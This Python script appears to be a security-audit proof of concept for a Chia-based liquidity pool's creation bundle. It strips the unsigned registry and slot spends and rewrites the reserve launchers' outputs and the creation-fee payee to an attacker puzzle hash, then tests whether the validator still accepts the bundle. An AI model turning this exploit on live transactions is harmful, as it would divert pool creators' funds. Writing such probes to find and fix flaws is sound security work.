#!/usr/bin/env python3
"""Probe: in the V14 creation bundle, is the registry spend (the only thing that asserts the
reserve launchers' and the fee settlement's announcements) separable from the creator's
SIGNED spends, and can a farmer then redirect the reserve launchers' CREATE_COIN target?

Control: the honest plan validates. Attack: drop registry + slot spends, rewrite each
reserve launcher's `created_puzzle_hash` and the fee settlement's payee to ATTACKER_PH,
keep the creator's spends byte for byte (so the aggregated signature still covers them).
"""
import sys
sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8")
from chia.types.blockchain_format.program import Program
from chia.wallet.cat_wallet.cat_utils import CAT_MOD, construct_cat_puzzle
from chia.wallet.lineage_proof import LineageProof
from chia.wallet.puzzles.p2_delegated_puzzle_or_hidden_puzzle import puzzle_for_synthetic_public_key
from chia.wallet.trading.offer import OFFER_MOD_HASH
from chia_rs import AugSchemeMPL, Coin, G2Element, SpendBundle
from chia_rs.sized_bytes import bytes32
from chia_rs.sized_ints import uint64
import forge_v14_create as create
import forge_v14_driver as drv
from forge_offer import ZERO_32

P2 = puzzle_for_synthetic_public_key(AugSchemeMPL.key_gen(b"\x01" * 32).get_g1())
CREATOR_PH = bytes32(b"\x77" * 32)
ATTACKER_PH = bytes32(b"\x99" * 32)
T_A = bytes32(b"\xa1" * 32)

def creator_xch(amount, salt):
    return create.CreatorXch(Coin(bytes32(bytes([salt]) * 32), P2.get_tree_hash(), uint64(amount)), P2)

def creator_cat(asset, amount, salt):
    outer = construct_cat_puzzle(CAT_MOD, asset, P2).get_tree_hash()
    grand = bytes32(bytes([salt]) * 32)
    coin = Coin(drv.coin_id(grand, outer, amount), outer, uint64(amount))
    return create.CreatorCat(asset, coin, P2, LineageProof(grand, P2.get_tree_hash(), uint64(amount)))

def fresh_registry():
    reg0 = drv.make_registry(salt=0x21, creation_fee=1_000_000, treasury_ph=bytes32(b"\x55" * 32))
    _b, new_state = drv.registry_spend(reg0, "forge_registry_init", [])
    reg1 = reg0.advance([x.as_int() for x in new_state.as_iter()])
    parent = {"parent_coin_info": reg0.coin.parent_coin_info.hex(), "puzzle_hash": reg0.coin.puzzle_hash.hex(), "amount": 1}
    slots = {k.hex(): {"key": k.hex(), "launcher_id": ZERO_32.hex(), "left": drv.MIN_KEY.hex(), "right": drv.MAX_KEY.hex(),
                       "parent": parent, "parent_inner_hash": reg0.inner_hash.hex()} for k in (drv.MIN_KEY, drv.MAX_KEY)}
    return reg1, slots

def additions_to(adds, ph):
    return [(p.hex()[:8], a) for p, a in adds if p == ph]

reg, slots = fresh_registry()
fee = 5_000_000
cfg = create.CreationConfig([None, T_A], [100_000_000, 50_000], [1, 1], 30, 5, bytes32(b"\x55" * 32), 50_000, "TXCH", "TXCH/A")
xch = creator_xch(2 + 100_000_000 + 1_000_000 + 49_999 + fee + 777, 0x31)
cat = creator_cat(T_A, 60_000, 0x32)
p = create.plan(reg, slots, cfg, xch, {T_A: cat}, CREATOR_PH, fee)
honest = create.finalize(p, G2Element())
conds, adds = drv.validate(honest)
print(f"[control] honest creation bundle validates, cost {conds.cost:,}, {len(honest.coin_spends)} spends")

# what the creator's SIGNED spends assert
for cs in p.creator_spends:
    out = Program.from_bytes(bytes(cs.puzzle_reveal)).run(Program.from_bytes(bytes(cs.solution)))
    ops = [c.first().as_int() for c in out.as_iter() if c.first().atom is not None]
    print(f"[creator spend] coin {cs.coin.name().hex()[:8]} amount {cs.coin.amount}: condition opcodes {ops}")

reg_coin_id = reg.coin.name()
launcher_phs = {drv.RESERVE_LAUNCHER_HASH, drv.reserve_launcher_full_hash(T_A)}
attack = []
dropped = []
for cs in p.router_spends:
    ph = cs.coin.puzzle_hash
    if cs.coin.name() == reg_coin_id or cs.coin.amount == 0:   # registry singleton and its 0-mojo slots
        dropped.append(cs.coin.name().hex()[:8]); continue
    if ph in launcher_phs:
        sol = Program.from_bytes(bytes(cs.solution))
        if ph == drv.RESERVE_LAUNCHER_HASH:
            created, amount, lid = list(sol.as_iter())
            new_sol = Program.to([ATTACKER_PH, amount, lid])
        else:  # CAT-wrapped launcher: inner solution is the first item of the CAT solution
            items = list(sol.as_iter())
            created, amount, lid = list(items[0].as_iter())
            items[0] = Program.to([ATTACKER_PH, amount, lid])
            new_sol = Program.to(items)
        attack.append(drv.make_spend(cs.coin, Program.from_bytes(bytes(cs.puzzle_reveal)), new_sol)); continue
    if ph == OFFER_MOD_HASH and cs.coin.amount == 1_000_000:   # the creation fee settlement
        attack.append(drv.make_spend(cs.coin, Program.from_bytes(bytes(cs.puzzle_reveal)),
                                     Program.to([[cs.coin.name(), [ATTACKER_PH, 1_000_000]]]))); continue
    attack.append(cs)
print(f"[attack] dropped unsigned spends: {dropped}")
bundle = SpendBundle([*p.creator_spends, *attack], G2Element())
try:
    conds, adds = drv.validate(bundle)
    print(f"[attack] ACCEPTED by the mempool validator, cost {conds.cost:,}")
    print(f"[attack]   XCH to attacker: {additions_to(adds, ATTACKER_PH)}")
    cat_att = construct_cat_puzzle(CAT_MOD, T_A, Program.to(ATTACKER_PH)).get_tree_hash_precalc(ATTACKER_PH)
    print(f"[attack]   CAT A to attacker (CAT-wrapped p2): {additions_to(adds, cat_att)}")
    print(f"[attack]   creator still receives LP: {[(a) for ph_, a in adds if ph_ == construct_cat_puzzle(CAT_MOD, p.pool.lp_asset_id, Program.to(CREATOR_PH)).get_tree_hash_precalc(CREATOR_PH)]}")
    print(f"[attack]   pool eve singleton still created: {(p.pool.coin.puzzle_hash, 1) in adds}")
    print(f"[attack]   reserve coins the pool's state names exist: {[(r.coin.puzzle_hash, int(r.coin.amount)) in adds for r in p.pool.reserves]}")
except drv.Rejected as exc:
    print(f"[attack] REFUSED: {exc}")
